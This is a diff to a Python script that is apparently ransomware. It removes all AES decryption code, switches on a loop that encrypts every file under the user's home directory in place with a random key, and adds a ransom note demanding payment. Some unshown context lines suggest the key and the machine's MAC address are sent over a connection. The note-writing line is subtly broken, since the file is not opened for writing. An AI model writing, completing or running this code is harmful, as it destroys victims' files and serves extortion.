@@ -1,6 +1,5 @@
 #!/usr/bin/python
 
-import os
 from pathlib import Path
 import secrets
 import uuid
@@ -41,7 +40,6 @@ class AES:
     def __init__(self, key):
         if not hasattr(self, 'sbox'):
             self.generate_sbox()
-            self.invert_sbox()
 
         if len(key) < 16:
             self.key = pad(bytes(key), 16)
@@ -73,12 +71,6 @@ class AES:
                 break
 
         cls.sbox[0] = 0x63
-
-    @classmethod
-    def invert_sbox(cls):
-        cls.inv_sbox = bytearray(256)
-        for i in range(256):
-            cls.inv_sbox[cls.sbox[i]] = i
 
     def expand_key(self):
         rc = 1
@@ -112,14 +104,6 @@ class AES:
         
         return bytes(self.state)
 
-    def decrypt_block(self, ct_block):
-        self.state = bytearray(ct_block)
-        for round in range(1, self.rounds):
-            self.decrypt_round(round)
-        self.add_key(0)
-
-        return bytes(self.state)
-
     def encrypt_round(self, round):
         self.sub_bytes()
         self.shift_rows()
@@ -127,30 +111,14 @@ class AES:
             self.mix_columns()
         self.add_key(round)
 
-    def decrypt_round(self, round):
-        self.add_key(self.rounds - round)
-        if round > 1:
-            self.inv_mix_columns()
-        self.inv_shift_rows()
-        self.inv_sub_bytes()
-
     def sub_bytes(self):
         self.state = self.state.translate(self.sbox)
-
-    def inv_sub_bytes(self):
-        self.state = self.state.translate(self.inv_sbox)
 
     def shift_rows(self):
         for i in range(1, 4):
             temp = self.state[i:i + 13:4]
             for j in range(4):
                 self.state[i + j * 4] = temp[(j + i) % 4]
-
-    def inv_shift_rows(self):
-        for i in range(1, 4):
-            temp = self.state[i:i + 13:4]
-            for j in range(4):
-                self.state[i + j * 4] = temp[(j - i) % 4]
 
     def mix_columns(self):
         for c in range(0, 16, 4):
@@ -160,36 +128,11 @@ class AES:
             self.state[c + 2] = temp[0] ^ temp[1] ^ gmul(temp[2], 2) ^ gmul(temp[3], 3)
             self.state[c + 3] = gmul(temp[0], 3) ^ temp[1] ^ temp[2] ^ gmul(temp[3], 2)
 
-    def inv_mix_columns(self):
-        for c in range(0, 16, 4):
-            temp = self.state[c:c + 4]
-            self.state[c] = gmul(temp[0], 14) ^ gmul(temp[1], 11) ^ gmul(temp[2], 13) ^ gmul(temp[3], 9)
-            self.state[c + 1] = gmul(temp[0], 9) ^ gmul(temp[1], 14) ^ gmul(temp[2], 11) ^ gmul(temp[3], 13)
-            self.state[c + 2] = gmul(temp[0], 13) ^ gmul(temp[1], 9) ^ gmul(temp[2], 14) ^ gmul(temp[3], 11)
-            self.state[c + 3] = gmul(temp[0], 11) ^ gmul(temp[1], 13) ^ gmul(temp[2], 9) ^ gmul(temp[3], 14)
-
     def add_key(self, round):
         offset = round * 16
         round_key = self.expanded_key[offset:offset + 16]
         for i in range(16):
             self.state[i] ^= round_key[i]
-
-class AES_ECB(AES):
-    def encrypt(self, plaintext: bytes):
-        plaintext = pad(plaintext, 16)
-
-        ciphertext = b''
-        for i in range(0, len(plaintext), 16):
-            ciphertext += self.encrypt_block(plaintext[i:i+16])
-        
-        return ciphertext
-
-    def decrypt(self, ciphertext):
-        plaintext = b''
-        for i in range(0, len(ciphertext), 16):
-            plaintext += self.decrypt_block(ciphertext[i:i+16])
-        
-        return plaintext
 
 class AES_CBC(AES):
     def encrypt(self, plaintext: bytes, iv: bytes):
@@ -203,17 +146,6 @@ class AES_CBC(AES):
             ciphertext += prev_ct
         
         return ciphertext
-
-    def decrypt(self, ciphertext, iv):
-        plaintext = b''
-        prev_ct = iv
-        for i in range(0, len(ciphertext), 16):
-            ct_block = ciphertext[i:i+16]
-            pt_block = self.decrypt_block(ct_block)
-            plaintext += xor(pt_block, prev_ct)
-            prev_ct = ct_block
-        
-        return plaintext
 
 def get_files_recursive(path: Path):
     files = []
@@ -231,7 +163,6 @@ def get_files_recursive(path: Path):
 
 home_dir = Path.home()
 files = get_files_recursive(home_dir)
-print(files)
 
 key = secrets.SystemRandom().randbytes(16)
 mac = uuid.getnode().to_bytes(6, 'big')
@@ -243,11 +174,13 @@ conn.close()
 
 aes = AES_CBC(key)
 
-# for file in files:
-#     with open(file, "rb") as thefile:
-#         contents = thefile.read()
-#     iv = secrets.SystemRandom().randbytes(16)
-#     contents_encrypted = aes.encrypt(contents, iv)
-#     print(iv + contents_encrypted)
-    # with open(file, "wb") as thefile:
-    #     thefile.write(iv + contents_encrypted)
+for file in files:
+    with open(file, "rb") as thefile:
+        contents = thefile.read()
+    iv = secrets.SystemRandom().randbytes(16)
+    contents_encrypted = aes.encrypt(contents, iv)
+    with open(file, "wb") as thefile:
+        thefile.write(iv + contents_encrypted)
+
+with open(str(home_dir) + "YOUHAVEBEENPWNED.txt") as message:
+    message.write("Your files have been encrypted. Pay me please!")
